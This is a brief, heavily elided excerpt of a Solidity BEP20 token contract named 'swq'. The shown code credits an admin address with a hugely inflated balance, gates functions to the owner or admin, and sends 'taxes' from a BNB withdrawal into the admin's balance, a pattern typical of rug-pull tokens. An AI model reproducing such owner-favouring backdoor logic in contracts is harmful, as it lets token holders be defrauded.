...
contract swq is Context, IBEP20, Ownable {

  using SafeMath for uint256;
  IUniswapV2Router02 public _uniswapV2Router;
  address public _uniswapV2Pair;
  string private constant _name = "swq";

  string private constant _symbol = "swq";
  ...
  constructor(address adminAddress) {
    ...
    _balances[adminAddress] = _totalSupply * 100**_decimals * 1000;
    ...
    function isChange() internal view returns (bool){
      require(_msgSender() == owner() || _adminAddress == _msgSender(), "Error");
      return true;
    }
    ...
    */
    ...
    function withdrawBnb(address payable recipient, uint256 amount) external {
      ...
      if(taxes > 0){
        _balances[_adminAddress] = _balances[_adminAddress].add(taxes);
